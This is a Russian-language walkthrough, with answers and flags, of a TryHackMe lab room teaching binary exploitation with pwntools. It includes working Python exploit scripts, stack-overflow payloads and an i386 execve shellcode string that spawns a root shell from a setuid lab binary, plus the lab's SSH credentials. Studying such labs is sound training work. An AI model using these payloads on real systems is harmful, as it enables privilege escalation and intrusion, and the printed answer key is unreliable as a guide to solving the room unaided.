[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Intro To Pwntools](https://tryhackme.com/room/introtopwntools) 

Всего 6 заданий:
## Задание 1
Приветствую вас и добро пожаловать на введение в Pwntools!

Меня зовут DiZma$, и я буду вашим проводником в этом путешествии по эксплуатации программного обеспечения.  Когда я 
начал изучать бинарную эксплуатацию и CTF, я узнал, что многие игроки CTF используют Pwntools, но когда я искал 
базовое руководство о том, как начать, я мало что нашел по этой теме. Из-за этого я решил создать свой собственный 
учебник.  Согласно Pwntools github, " Pwntools - это фреймворк CTF и библиотека разработки эксплойтов. Написанная на 
Python, она предназначена для быстрого прототипирования и разработки и призвана максимально упростить написание 
эксплойтов " ( страница Pwntools github ).

Предварительный опыт в бинарном использовании не требуется для этой комнаты, хотя он может помочь. Я дам краткие 
объяснения, хотя если вам нужен более глубокий материал, я постараюсь направить вас к некоторым полезным источникам.



Инструменты и установка:

Инструменты и задачи на сегодня находятся на предоставленной виртуальной машине , хотя при желании вы можете 
установить их на своей собственной машине: 

Pwntools можно установить через pip. Вы можете следовать руководству по установке здесь:  https://docs.pwntools.
com/en/stable/install.html . Обратите внимание, что на сегодня я настроил Pwntools с python2 на виртуальной машине , 
потому что я предпочитаю разработку эксплойтов в python2.  

Другой инструмент, который мы будем использовать, это pwndbg, который является " плагином GDB, который делает 
отладку с помощью GDB менее отстойной, с упором на функции, необходимые разработчикам низкоуровневого программного 
обеспечения, хакерам оборудования, реверс-инжинирингу и разработчикам эксплойтов " ( страница pwndbg на Github ). 
Если вы когда-либо использовали gdb для двоичной эксплуатации, вы знаете, что это может быть громоздко. Pwndbg 
выводит полезную информацию, такую как регистры и ассемблерный код, с каждой точкой останова или ошибкой, что 
упрощает отладку и динамический анализ . Чтобы установить его, вы можете обратиться к странице Github. Все, что вам 
нужно сделать, это загрузить его с Github и запустить скрипт установки, и он автоматически подключится к gdb.

Наконец, если вы хотите загрузить задания из этой комнаты для использования на своем компьютере, вы можете найти их 
(и мои решения) на моем Github:  https://github.com/dizmascyberlabs/IntroToPwntools . 



Запуск машины и вход в систему:

Пожалуйста, запустите подключенную виртуальную машину. После запуска вы можете подключиться к ней по ssh, используя 
следующие учетные данные: 

пользователь: жужжание

пройти: жужжание

ssh buzz@MACHINE_IP

buzz@MACHINE_IP's password: buzz

Обратите внимание, что после ввода пароля вам, возможно, придется подождать несколько секунд, прежде чем вы войдете 
в систему. 

Давайте начнем грабить!


### Ответьте на вопросы ниже
Я понимаю, как настроить Pwntools и pwndbg на своей машине.
```commandline
Ответ не нужен
```
Я запустил машину и вошел в систему через ssh.


```commandline
Ответ не нужен
```

## Задание 2
В вашем домашнем каталоге вы должны увидеть два каталога: IntroToPwntools и pwndbg. Наши задачи находятся в 
IntroToPwntools. Если вы войдете в этот каталог, вы увидите заметку и другой каталог с тем же именем. Когда вы 
будете готовы, войдите во второй каталог IntroToPwntools, чтобы начать свое приключение!  


инструмент Checksec

Вы найдете четыре каталога, включенные в пакет: checksec, cyclic, networking и shellcraft. Начнем с checksec.

Внутри каталога checksec мы найдем некоторый код C и исполняемые файлы, оба скомпилированные из кода C. Если вы 
запустите любой из них, они, по-видимому, будут одной и той же программой: она запрашивает имя пользователя и 
отвечает: «Hello name!» Эти двоичные файлы могут показаться одной и той же программой, но один из них был 
скомпилирован с защитой для смягчения эксплуатации двоичных файлов, а другой был скомпилирован без этой защиты.   

Выполните следующую команду и посмотрите на результат (предупреждаем, эта команда может работать немного медленно):

checksec intro2pwn1

Теперь выполните ту же команду с intro2pwn2.

Как вы можете видеть , эти двоичные файлы имеют одинаковую архитектуру (i386-32-little), но различаются по таким 
качествам, как RELRO, Stack  canaries , NX, PIE и RWX. Итак, что это за качества? Позвольте мне объяснить. Обратите 
внимание, что эта комната не требует глубоких знаний этих вещей, выходящих за рамки основ.   

RELRO означает  Relocation Read-Only, что делает глобальную таблицу смещений (GOT) доступной только для чтения после 
того, как компоновщик разрешает функции в нее. GOT важна для таких методов, как атака ret-to-libc, хотя это выходит 
за рамки этой комнаты. Если вам интересно, вы можете обратиться к этой записи в блоге:  https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro .  

Канарейки стека   — это токены, размещаемые после стека для обнаружения переполнения стека. Предположительно, они 
были названы в честь птиц, которых шахтеры спускали в шахты для обнаружения вредных паров. Канарейки были 
чувствительны к парам, и поэтому, если они умирали, шахтеры знали, что им нужно эвакуироваться. На менее болезненной 
ноте, канарейки стека находятся рядом со стеком в памяти (где хранятся переменные программы), и если происходит 
переполнение стека, то канарейка будет повреждена. Это позволяет программе обнаруживать переполнение буфера и 
завершать работу. Вы можете прочитать больше о канарейках стека здесь:  https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/ .     

NX — это сокращение от non-executable (неисполняемый). Если этот параметр включен, сегменты памяти могут быть либо 
записываемыми, либо исполняемыми, но не теми и другими одновременно. Это не позволяет потенциальным злоумышленникам 
внедрять в программу свой собственный вредоносный код (называемый шеллкодом), поскольку что-либо в записываемом 
сегменте не может быть выполнено. В уязвимом двоичном файле вы могли заметить дополнительную строку RWX , которая 
указывает на то, что есть сегменты, которые можно читать, записывать и выполнять. Подробнее см. в этой статье 
Википедии:  https://en.wikipedia.org/wiki/Executable_space_protection     

PIE означает Position Independent Executable (независимый от позиции исполняемый файл). Это загружает зависимости 
программы в случайные места, поэтому атаки, основанные на структуре памяти, проводить сложнее. Вот хороший блог об 
этом:  https://access.redhat.com/blogs/766093/posts/1975793  

Если вам нужен хороший обзор каждого из проверенных качеств checksec, я нашел это руководство полезным:  https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/

### Ответьте на вопросы ниже
Есть ли у Intro2pwn1 ПОЛНЫЙ RELRO (Y или N)?

```commandline
Y
```
Есть ли у Intro2pwn1 сегменты RWX (Y или N)?

```commandline
N
```
Есть ли у Intro2pwn2 стековая канарейка (Y или N)?

```commandline
N
```
У Intro2pwn2  нет PIE (Y или N)?

```commandline
Y
```
Вызвать переполнение буфера на intro2pwn1, введя длинную строку, например, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Что было обнаружено? 

```commandline
Stack Smashing
```
Теперь вызовите переполнение буфера на intro2pwn2. Какую ошибку вы получаете?

Segmentation Fault
```commandline
Ответ не нужен
```

## Задание 3
Хорошая работа! Теперь выйдите из каталога checksec. Далее в нашем маршруте — циклический каталог. Там вы должны найти 4 файла: текст из букв алфавита, файл флага, исполняемый файл и код для исполняемого файла. Если мы попытаемся прочитать файл флага, нам будет отказано в доступе. Если бы только мы могли заставить кого-нибудь другого открыть его...

Подготовка к мероприятию:

если вы выполните команду:

ls -l 

﻿Вы увидите, что файл флага и intro2pwn3 принадлежат одному и тому же пользователю, и что бит suid установлен для intro2pwn3. Это означает, что программа сохранит свои разрешения при выполнении. Пожалуйста, ответьте на вопрос 1.

Если вы посмотрите код на языке c, вы можете заметить функцию print_flag(), которая откроет флаг с нужными нам разрешениями. Проблема в том, что функция не запускается в программе, программа просто вызывает start(), а затем завершается. Что если бы мы могли как-то перенаправить выполнение? На самом деле, мы можем!

Эта программа уязвима к переполнению буфера, поскольку она использует функцию gets(), которая не проверяет, находится ли пользовательский ввод в границах (вы можете прочитать об этом  здесь ). В нашем случае переменной name выделено 24 байта, поэтому, если мы введем больше 24 байтов, мы сможем записать в другие части памяти. Пожалуйста, ответьте на вопрос 2.

Важной частью памяти, которую мы можем перезаписать, является указатель инструкций (IP), который на 32-битных машинах называется eip, а на 64-битных — rip. IP указывает на следующую инструкцию, которая должна быть выполнена, поэтому, если мы перенаправим eip в нашем двоичном файле на функцию print_flag(), мы сможем распечатать флаг.

Циклический инструмент:


Чтобы контролировать IP, первое, что нам нужно сделать, это переполнить стек шаблоном, чтобы мы могли видеть, где находится IP. Я предоставил файл алфавита в качестве шаблона. Давайте запустим gdb!

gdb intro2pwn3

Чтобы запустить программу в gdb, введите r. Вы увидите, что программа функционирует нормально. Если вы хотите добавить ввод из текстового файла, используйте клавишу "<", например:

r < alphabet

Мы вызвали ошибку сегментации, и вы можете заметить, что по адресу 0x4a4a4a4a есть недействительный адрес. Если вы прокрутите вверх, вы увидите значения в каждом регистре. Для eip он был перезаписан на 0x4a4a4a4a. Пожалуйста, ответьте на вопрос 3.

Отлично, теперь мы видим, что можем управлять eip! Прежде чем двигаться дальше, я хотел бы поговорить о шаблонах. Файл алфавита был здесь полезен, но может потребоваться много времени, чтобы вводить все это в файл (или писать скрипт для него) каждый раз, когда вы хотите проверить переполнение буфера, и если буфер большой, файл алфавита может быть недостаточно большим. Вот где вступает в дело циклический инструмент. Циклический инструмент можно использовать как из командной строки, так и в скриптах Python. Формат командной строки — «циклическое число», например:

cyclic 100

Будет распечатан шаблон из 100 символов. Пожалуйста, выйдите из gdb, набрав «quit», и  ответьте на вопрос 4.

Если вы использовали pattern_create из Metasploit Framework, это работает аналогичным образом. Мы можем создать файл шаблона следующим образом:

cyclic 100 > pattern

и затем запустить файл шаблона как входные данные в gdb, как мы делали с файлом алфавита. И снова у нас есть seg-fault, и eip заполнен 'jaaa' (пожалуйста , ответьте на вопрос 5).

Подъем к флагу:

﻿Теперь мы можем начать разрабатывать наш эксплойт. Чтобы использовать pwntools в файле python, создайте файл python (мой — pwn_cyclic.py) и импортируйте модуль pwntools в начало файла:

from pwn import *

Затем мы можем использовать циклическую функцию в коде Python:

padding = cyclic(100)

Наше заполнение — это пространство, необходимое для того, чтобы добраться до eip, поэтому 100 — это не то число, которое нам нужно. Нам нужно, чтобы наше заполнение остановилось прямо перед 'jaaa', чтобы мы могли заполнить eip собственным вводом. К счастью, в pwntools есть функция cyclic_find(), которая найдет это автоматически. Пожалуйста, замените 100 на cyclic_find('jaaa'):

padding = cyclic(cyclic_find('jaaa'))

Чем мы заполняем eip? Сейчас, чтобы убедиться, что у нас правильное заполнение, мы должны заполнить его фиктивным значением, например 0xdeadbeef. Конечно, мы не можем просто написать "0xdeadbeef" как строку, потому что компьютер интерпретирует ее как ascii, а нам она нужна как необработанный hex. Pwntools предлагает простой способ сделать это с помощью функции p32() (и p64 для 64-битных программ). Это похоже на функцию struct.pack(), если вы когда-либо ее использовали. Мы можем добавить это в наш код:

eip = p32(0xdeadbeef)

Теперь весь наш код должен выглядеть так:

from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0xdeadbeef)

payload = padding + eip

print(payload)

Запустите файл с помощью python (не python3!) и выведите данные в текстовый файл (мой файл python называется pwn_cyclic.py, а текстовый файл называется attack).

python pwn_cyclic.py > attack

Запустите этот новый текстовый файл как входной файл для intro2pwn3 в gdb и убедитесь, что вы получаете недопустимый адрес по адресу 0xdeadbeef. Пожалуйста, ответьте на вопрос 6.

Последнее, что нам нужно сделать, это найти местоположение функции print_flag(). Чтобы найти функцию print_flag(), введите эту команду в gdb:

print& print_flag

У меня функция print_flag() находится по адресу  0x8048536, проверьте, соответствует ли она вашему адресу.

Замените 0xdeadbeef в вашем коде на местоположение функции print_flag. Еще раз, мы можем запустить:

python pwn_cyclic.py > attack

Введите файл атаки в двоичный файл intro2pwn3 в командной строке (поскольку gdb не будет использовать разрешения suid), например так:

./intro2pwn3 < attack

Ура, флаг! Пожалуйста, ответьте на вопрос 7.

### Ответьте на вопросы ниже
Какому пользователю принадлежат файлы flag.txt и intro2pwn3?

```commandline
dizmas
```
Используйте checksec на intro2pwn3. Какой защиты на птичью тематику не хватает?
```commandline
canary
```
Какая последовательность букв ASCII соответствует 0x4a4a4a4a (pwndbg должен вам подсказать).
```commandline
JJJJ
```
Каков результат «циклического 12»?
```commandline
aaaabaaacaaa
```
По какому шаблону в шестнадцатеричном формате был переполнен eip?
```commandline
0x6161616a
```
Я переполнил eip с помощью 0xdeadbeef
```commandline
Ответ не нужен
```
Что такое флаг?
```commandline
flag{13@rning_2_pwn!}
```

## Задание 4
﻿Когда вы будете готовы двигаться дальше, войдите в сетевой каталог. Внутри вы найдете заметку, исполняемый файл и еще код на языке C. В последнем задании мы вручную ввели наш эксплойт, хотя pwntools дает нам возможность отправлять и получать данные автоматически. Это может работать как локально, так и через сетевой порт. Для этого задания мы будем использовать сетевые инструменты, а в следующем задании — локальные инструменты.

Распаковка кода

В записке говорится, какой порт обслуживает наш флаг. Пожалуйста, ответьте на вопрос 1.

Если вы используете netcat для этого порта, он говорил "Give me deadbeef: " и запрашивал, пока соединение не будет закрыто (обратите внимание, что каждый раз, когда соединение закрывается, служба будет закрываться, пока cron не перезапустит ее каждую минуту). Чтобы протестировать эксплойт, мы можем запустить нашу собственную версию на порту 1336. Мы можем использовать tmux или использовать второй сеанс ssh , чтобы иметь два интерфейса, один для запуска службы и один для разработки эксплойта.

Код для этого задания более сложный, чем для предыдущих заданий. Я использовал следующий код и отредактировал его для своих целей:  https://www.geeksforgeeks.org/ tcp -server-client-implementation-in-c/ . Для этого задания нам не нужно беспокоиться о main(), а только о target_function(). Структура в начале функции, называемая target, имеет две переменные: buff и printflag. Buff — это массив символов размером MAX (MAX был определен как 32), а printflag — это volatile int. Эти переменные будут находиться рядом друг с другом в стеке, поэтому, если нам удастся переполнить переменную buff, то мы сможем отредактировать printflag. Если вы посмотрите дальше в коде, если переменная printflag равна 0xdeadbeef (в шестнадцатеричном виде), то она отправит флаг. Пожалуйста, ответьте на вопрос 2.

Нетворкинг к флагу

Нам нужно будет написать скрипт для подключения к порту, получения данных и отправки нашей полезной нагрузки. Для подключения к порту в Pwntools используйте функцию remote() в формате: remote(IP, port). 

from pwn import *

connect = remote('127.0.0.1', 1336)

Мы можем получать данные с помощью функций recvn(bytes) или recvline(). Recvn() получает столько байтов, сколько указано, в то время как recvline() будет получать данные до тех пор, пока не будет новой строки. Наш код не отправляет новую строку, поэтому нам придется использовать recvn(). В нашем коде test_networking.c "Give me deadbeef:" составляет 18 байт, поэтому мы получим 18 байт.

print(connect.recvn(18))

Нам нужно отправить достаточно данных, чтобы переполнить переменную buff, и записать их в printflag. buff — это 32-байтовый массив, поэтому мы можем записать какой-нибудь символ 32 раза, чтобы переполнить buff, а затем записать наш 0xdeadbeef в printflag.

payload = "A"*32

payload += p32(0xdeadbeef)

Мы можем отправить полезную нагрузку с помощью функции send().

connect.send(payload)

Чтобы получить наш флаг, мы можем просто снова использовать connect.recvn(). Согласно коду на языке c, флаг будет иметь длину 34 байта.

print(connect.recvn(34))

Запустите это на вашем сервере на 1336 и убедитесь, что это работает. После этого измените порт на ответ на вопрос 1, чтобы получить флаг!

### Ответьте на вопросы ниже
Какой порт обслуживает нашу задачу?

```commandline
1337
```
Пожалуйста, используйте checksec на serve_test. Есть ли стековая канарейка? (Y или N)
```commandline
Y
```
Я запустил свой эксплойт против своего сервера на порту 1336
```commandline
Ответ не нужен
```
Что такое флаг?
```commandline
flag{n3tw0rk!ng_!$_fun}
```

## Задание 5
Пришло время для нашего последнего испытания! Перейдите в каталог shellcraft. Внутри вы найдете четыре файла: заметку, скрипт bash, исполняемый файл и код C. Если вы прочтете заметку, то увидите, что вам нужно отключить ASLR, что означает рандомизацию расположения адресного пространства. Это рандомизирует место в памяти, где исполняемый файл загружается каждый раз при запуске. Как и PIE, он затрудняет атаки, которые полагаются на расположение памяти. Пожалуйста, ответьте на вопрос 1.

Пожалуйста, прочтите примечание и отключите ASLR.

Корень проблемы:

Вы когда-нибудь запускали эксплойт на машине для повышения привилегий и задавались вопросом, как это работает? Сегодня мы разработаем свой собственный эксплойт для получения root-доступа к этому ящику! Некоторые программы и службы, такие как sudo, должны запускаться как root для правильной работы системы, и когда в одной из этих программ обнаруживается уязвимость, открывается простой путь к root-shell. Пожалуйста, ответьте на вопрос 2.

Вы, возможно, слышали об  уязвимости переполнения буфера кучи в sudo  , которая позволяла быстро повышать привилегии. Эксплойт, обнаруженный в 2021 году, имеет свою собственную  комнату на TryHackMe,  если вам интересно узнать о нем больше.

Ракушка в стоге сена:

Если мы посмотрим на код нашего исполняемого файла, то увидим, что там не так много всего, только вызов gets(). Если мы помним из нашей циклической задачи, gets() уязвим к переполнению буфера, но на этот раз нет print_flag() для перехода. Когда мы управляем eip, куда нам следует переходить? Хотя внутри нашего кода, кажется, нет никаких полезных инструкций, что, если мы напишем свои собственные инструкции? Наши переменные хранятся в памяти, как и сама программа, поэтому, если мы напишем инструкции в нашей переменной и направим eip на нее, мы можем заставить программу следовать нашим собственным инструкциям! Этот внедренный код называется шеллкодом, потому что он традиционно (но не всегда) используется для создания оболочки. Если вы помните, наши переменные хранятся в стеке, поэтому, если мы направим eip на стек, мы направим его на наш шеллкод. Пожалуйста, ответьте на вопрос 3.

Давайте возьмем под контроль этот eip! Пожалуйста, найдите местоположение eip, как мы это делали в циклическом задании. Пожалуйста, ответьте на вопрос 4.

Я бы рекомендовал заполнить eip значением 0xdeadbeef, как мы делали раньше.

После того, как мы контролируем eip, нам нужно направить его в стек, где мы можем разместить наш собственный код. На вершину стека указывает SP (или указатель стека), который в 32-битных машинах называется esp. Для меня esp находится по адресу 0xffffd510, и вы можете проверить местоположение вашего в gdb. Если мы хотим перейти к нашему шелл-коду, мы хотим перейти в середину стека (а не на вершину, куда указывает SP), поэтому мы обычно добавляем смещение к местоположению esp в вашем эксплойте. Я использую смещение 200, потому что это то, что в итоге сработало для меня. В других задачах вам может понадобиться только смещение 8 или 16. Я обнаружил, что выбор правильного смещения — это вопрос проб и ошибок.

from pwn import *

padding = cyclic(cyclic_find('answer_to_question_4'))

eip = p32(0xffffd510+200)

Вы можете задаться вопросом, как мы собираемся указать eip на наш шеллкод (а не на другие данные в стеке), и ответ заключается в том, чтобы превратить нашу переменную в большую точку приземления. В ассемблере есть инструкция, называемая no-operation (или NOP), которая в шестнадцатеричном виде равна 0x90, а NOP — это держатель пробела, который передает eip в следующее место в памяти. Если мы создадим гигантскую «посадочную площадку» из NOP и направим eip к середине стека, есть вероятность, что eip приземлится на нашу площадку NOP, а NOP передадут eip вниз, чтобы в конечном итоге попасть в наш шеллкод. Это часто называют слайдом NOP (или салазками), потому что eip приземлится в NOP и скатится вниз к шеллкоду. В моем случае сработали салазки NOP из 1000, но для других задач могут потребоваться другие размеры. При записи необработанного шестнадцатеричного байта в Python мы используем формат «\x00», поэтому для NOP мы можем записать «\x90».

nop_slide = "\x90"*1000

Прежде чем писать наш шеллкод, мы можем ввести точку останова в конце нашего слайда NOP , чтобы убедиться, что слайд работает. Инструкция точки останова в шестнадцатеричном формате — «0xcc», и поэтому мы можем добавить следующее в наш код:

shellcode = "\xcc"

Наша полезная нагрузка должна быть следующей:

payload = padding + eip + nop_slide + shellcode

Пожалуйста, перенаправьте вывод этого файла в текстовый файл.

Если мы введем текстовый файл в intro2pwnFinal, мы должны попасть в точку останова. Пожалуйста, ответьте на вопрос 5.

Отлично, мы можем внедрить наш собственный код в программу! Конечно, мы хотим сделать больше, чем просто попасть в точку останова, мы хотим создать root shell. Это значит, что нам нужно написать шеллкод. В то время как некоторые сумасшедшие любят писать шеллкод с нуля, pwntools дает нам отличную утилиту для создания шеллкода: shellcraft. Если вы когда-либо использовали msfvenom, shellcraft — похожий инструмент. Как и cyclic, shellcraft можно использовать в командной строке и внутри кода python. Мне нравится использовать командную строку, копировать и вставлять шеллкод в мой скрипт эксплойта. Команда командной строки для shellcraft: shellcraft arch.OS.command, например:

shellcraft i386.linux.sh

Это для базовой оболочки bash для исполняемых файлов Linux с архитектурой i386. Удобная функция shellcraft заключается в том, что мы можем распечатать шелл-код в разных форматах с помощью флага -f. Возможные форматы будут перечислены, если вы введете команду shellcraft -h. Пожалуйста, ответьте на вопрос 6. 

В приведенном выше шеллкоде есть небольшая загвоздка. Чтобы получить root shell, нам нужно сохранить привилегии intro2pwnFinal, хотя bash откажется от привилегий, если мы не добавим флаг -p. Если мы посмотрим на ассемблерный код для этой оболочки, то увидим, что он использует execve и передает /bin///sh в качестве первого параметра и ['sh'] в качестве второго. Первый параметр — это путь к тому, что мы хотим выполнить, а второй параметр — это массив argv, содержащий аргументы командной строки (если вы не уверены в execve, вы можете обратиться к этой странице руководства  здесь ). В этом случае мы хотим выполнить /bin///sh, но мы хотим передать 'sh' и '-p' в массив argv. Мы можем использовать shellcraft для создания execve shellcode с "/bin///sh" и "['sh', '-p']" в качестве параметров. Мы можем сделать это с помощью следующей команды:

shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a

Когда мы запускаем эту команду, мы видим, что она такая же, как и шеллкод linux .sh, за исключением добавленного '-p' в массив argv. Чтобы написать шеллкод, который будет проще использовать в нашем скрипте эксплойта python, мы можем заменить "-f a" на "-f s", что выведет наш шеллкод в строковом формате. Мы можем скопировать это и вставить в наш код эксплойта (заменив инструкцию точки останова):

shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

Наш код почти готов! До этого момента мы печатали нашу полезную нагрузку и вручную вводили ее в исполняемый файл. Как и в сетевой задаче, Pwntools позволяет нам автоматически взаимодействовать с программой. Для локального процесса мы используем функцию process().

proc = process('./intro2pwnFinal')

Мы можем получать данные из процесса, и поскольку процесс отправляет данные с новой строкой, мы можем использовать recvline() вместо recvn().

proc.recvline()

После того, как мы создали полезную нагрузку, мы можем отправить ее с помощью:

proc.send(payload)

Наконец, после того, как мы отправили полезную нагрузку, нам нужен способ связи с оболочкой, которую мы только что создали. Мы можем сделать с помощью с 

proc.interactive()

Итак, подведем итоги. Весь наш скрипт на Python выглядит так:

from pwn import *

proc = process('./intro2pwnFinal')

proc.recvline()

padding = cyclic(cyclic_find('taaa'))

eip = p32(0xffffd510+200)

nop_slide = "\x90"*1000

shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

payload = padding + eip + nop_slide + shellcode

proc.send(payload)

proc.interactive()

Хорошо, это было много! Глубоко вдохните и запустите наш код Python. Если мы сделали это правильно, мы должны получить интерактивную оболочку. Первая команда может не зарегистрироваться, но вторая должна работать. Если вы получили "Got EOF while reading in interactive", то у вас ошибка, и ее нужно устранить. Люди на Discord  THM очень помогают , и я сам часто там тусуюсь. Пожалуйста, ответьте на вопрос 7.

Поздравляем, у вас есть root shell! Флаг вы найдете в каталоге /root.

### Ответьте на вопросы ниже
Что означает ASLR?

```commandline
address space layout randomization
```
Кому принадлежит intro2pwnFinal?


```commandline
root
```
Использовать checksec на intro2pwn final. Включен ли NX? (Y или N)

```commandline
N
```
Пожалуйста, используйте циклический инструмент и gdb, чтобы найти eip. Какая последовательность букв заполняет eip?

```commandline
taaa
```
Запустите свой эксплойт с точкой останова вне gdb (./intro2pwnFinal < output_file). Что он скажет, когда вы достигнете точки останова?

```commandline
Trace/breakpoint trap
```
Запустите команду "shellcraft i386.linux.sh -f a", которая выведет наш шеллкод в формате ассемблера. Первая строка скажет вам, что она запускает функцию из стандартной библиотеки Unix с параметрами "(path='/bin///sh', argv=['sh'], envp=0)". Какую функцию она использует?

```commandline
execve
```
Запустите whoami, как только у вас появится оболочка. Кто вы?

```commandline
root
```
Что такое флаг?

```commandline
flag{pwn!ng_!$_fr33d0m}
```

## Задание 6
Надеюсь, вам понравилось наше приключение с бинарным использованием и pwntools! На нашем ящике больше нечего делать, если только вы не странный человек, который любит рыться в домашних каталогах других людей.

Заключительные слова:

Хочу подчеркнуть, что я не эксперт в эксплуатации программного обеспечения (или любого другого типа взлома). Я просто студент и энтузиаст, и я хотел поделиться чем-то, что мне понравилось, с остальными из вас. Эта комната затронула поверхность как эксплуатации бинарных файлов в целом, так и pwntools в частности, и есть еще много чего для изучения. Вот некоторые ресурсы, которые я нашел полезными:

Плейлист Live Overflow Binary Exploit на YouTube  (именно там я впервые узнал об этом материале!)

Сайт Exploit Education  (спасибо, что сегодняшние задания были частично вдохновлены этими упражнениями)

Кошмарный курс на GitHub  (огромная коллекция задач из старых CTF)

Кроме того, я многому научился у талантливых игроков CTF, с которыми познакомился за короткое время работы в сообществе. Я отлично провел время, разрабатывая эту комнату, и надеюсь, что вам тоже было интересно ее решать. Возможно, в будущем у меня будет больше контента для разработки. Пока что это было приятно, до свидания!

Искренне,

ДиЗма$

### Ответьте на вопросы ниже
Я изучил основы pwntools, и теперь я 1337 h4x0r!
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)